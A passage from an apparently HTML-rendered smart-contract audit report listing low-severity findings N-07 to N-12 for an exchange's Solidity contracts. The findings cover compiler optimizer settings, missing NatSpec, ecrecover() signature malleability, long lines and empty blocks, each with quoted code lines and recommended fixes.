class=\"mtk12\">BASE_URI</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pageId</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toString</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span></code></pre>\n<h2 id=\"n-07-solidity-compiler-optimizations-can-be-problematic\" style=\"position:relative;\"><a href=\"#n-07-solidity-compiler-optimizations-can-be-problematic\" aria-label=\"n 07 solidity compiler optimizations can be problematic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-07] Solidity compiler optimizations can be problematic</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">hardhat</span><span class=\"mtk1\">.</span><span class=\"mtk12\">config</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ts</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">69</span><span class=\"mtk1\">    },</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">70</span><span class=\"mtk1\">:   solidity: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">71</span><span class=\"mtk1\">:     compilers: [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">72</span><span class=\"mtk1\">:       {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">73</span><span class=\"mtk12\">:</span><span class=\"mtk1\">         </span><span class=\"mtk12\">version</span><span class=\"mtk1\">: </span><span class=\"mtk8\">&#39;0.8.17&#39;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">74</span><span class=\"mtk12\">:</span><span class=\"mtk1\">         </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">75</span><span class=\"mtk12\">:</span><span class=\"mtk1\">           </span><span class=\"mtk12\">metadata</span><span class=\"mtk1\">: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">76</span><span class=\"mtk12\">:</span><span class=\"mtk1\">             </span><span class=\"mtk12\">bytecodeHash</span><span class=\"mtk1\">: </span><span class=\"mtk8\">&#39;none&#39;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">77</span><span class=\"mtk12\">:</span><span class=\"mtk1\">           },</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">78</span><span class=\"mtk12\">:</span><span class=\"mtk1\">           </span><span class=\"mtk12\">optimizer</span><span class=\"mtk1\">: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">79</span><span class=\"mtk12\">:</span><span class=\"mtk1\">             </span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">: </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">80</span><span class=\"mtk12\">:</span><span class=\"mtk1\">             </span><span class=\"mtk12\">runs</span><span class=\"mtk1\">: </span><span class=\"mtk7\">800</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">81</span><span class=\"mtk12\">:</span><span class=\"mtk1\">           },</span></span></span></code></pre>\n<h3 id=\"description-3\" style=\"position:relative;\"><a href=\"#description-3\" aria-label=\"description 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>Protocol has enabled optional compiler optimizations in Solidity.\nThere have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. </p>\n<p>Therefore, it is unclear how well they are being tested and exercised.\nHigh-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. </p>\n<p>Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported.\nA compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe.\nIt is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations.</p>\n<p>Exploit Scenario\nA latent or future bug in Solidity compiler optimizations—or in the Emscripten transpilation to solc-js—causes a security vulnerability in the contracts.</p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug.<br>\nLong term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.</p>\n<h2 id=\"n-08-natspec-is-missing\" style=\"position:relative;\"><a href=\"#n-08-natspec-is-missing\" aria-label=\"n 08 natspec is missing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-08] NatSpec is missing</h2>\n<h3 id=\"description-4\" style=\"position:relative;\"><a href=\"#description-4\" aria-label=\"description 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>NatSpec is missing for the following functions , constructor and modifier:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">10</span><span class=\"mtk1\">  </span><span class=\"mtk12\">results</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">70</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">79</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">83</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">35</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">whenOpen</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">40</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setupExecution</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">47</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">48</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">internalCall</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">52</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">53</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Opened</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">54</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Closed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">55</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">56</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">open</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">60</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">close</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<h2 id=\"n-09-signature-malleability-of-evms-ecrecover\" style=\"position:relative;\"><a href=\"#n-09-signature-malleability-of-evms-ecrecover\" aria-label=\"n 09 signature malleability of evms ecrecover permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-09] Signature Malleability of EVM’s ecrecover()</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">523</span><span class=\"mtk1\">          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">v</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">27</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">v</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">28</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid v parameter&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">524</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recoveredSigner</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ecrecover</span><span class=\"mtk1\">(</span><span class=\"mtk12\">digest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">v</span><span class=\"mtk1\">, </span><span class=\"mtk12\">r</span><span class=\"mtk1\">, </span><span class=\"mtk12\">s</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">525</span><span class=\"mtk1\">          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">recoveredSigner</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span></code></pre>\n<h3 id=\"description-5\" style=\"position:relative;\"><a href=\"#description-5\" aria-label=\"description 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>Description: The function calls the Solidity ecrecover() function directly to verify the given signatures. However, the ecrecover() EVM opcode allows malleable (non-unique) signatures and thus is susceptible to replay attacks.</p>\n<p>Although a replay attack seems not possible for this contract, I recommend using the battle-tested OpenZeppelin’s ECDSA library.</p>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use the ecrecover function from OpenZeppelin’s ECDSA library for signature verification. (Ensure using a version > 4.7.3 for there was a critical bug >= 4.1.0 &#x3C; 4.7.3).</p>\n<h2 id=\"n-10-lines-are-too-long\" style=\"position:relative;\"><a href=\"#n-10-lines-are-too-long\" aria-label=\"n 10 lines are too long permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-10] Lines are too long</h2>\n<p>Usually lines in source code are limited to 80 characters. Today’s screens are much larger so it’s reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over 164 characters, the lines below should be split when they reach that length.<br>\nReference:<br>\n<a href=\"https://docs.soliditylang.org/en/v0.8.10/style-guide.html#maximum-line-length\">https://docs.soliditylang.org/en/v0.8.10/style-guide.html#maximum-line-length</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">546</span><span class=\"mtk1\">:             (</span><span class=\"mtk12\">canMatch</span><span class=\"mtk1\">, </span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assetType</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">IMatchingPolicy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sell</span><span class=\"mtk1\">.</span><span class=\"mtk12\">matchingPolicy</span><span class=\"mtk1\">).</span><span class=\"mtk11\">canMatchMakerAsk</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sell</span><span class=\"mtk1\">, </span><span class=\"mtk12\">buy</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">550</span><span class=\"mtk1\">:             (</span><span class=\"mtk12\">canMatch</span><span class=\"mtk1\">, </span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assetType</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">IMatchingPolicy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">buy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">matchingPolicy</span><span class=\"mtk1\">).</span><span class=\"mtk11\">canMatchMakerBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">buy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sell</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"n-11-stop-using-v--27--v--28-or-v--27--v--28\" style=\"position:relative;\"><a href=\"#n-11-stop-using-v--27--v--28-or-v--27--v--28\" aria-label=\"n 11 stop using v  27  v  28 or v  27  v  28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-11] Stop using <code>v != 27 &#x26;&#x26; v != 28 or v == 27 || v == 28</code></h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">523</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">v</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">27</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">v</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">28</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid v parameter&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>See this for reference:<br>\n<a href=\"https://twitter.com/alexberegszaszi/status/1534461421454606336?s=20&#x26;t=H0Dv3ZT2bicx00hLWJk7Fg\">https://twitter.com/alexberegszaszi/status/1534461421454606336?s=20&#x26;t=H0Dv3ZT2bicx00hLWJk7Fg</a></p>\n<h2 id=\"n-12-empty-blocks-should-be-removed-or-emit-something\" style=\"position:relative;\"><a href=\"#n-12-empty-blocks-should-be-removed-or-emit-something\" aria-label=\"n 12 empty blocks should be removed or emit something permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-12] <code>Empty blocks</code> should be <em>removed</em> or <em>Emit</em> something</h2>\n<h3 id=\"description-6\" style=\"position:relative;\"><a href=\"#description-6\" aria-label=\"description 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>Code contains empty block</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">results</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">files</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Exchange</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span 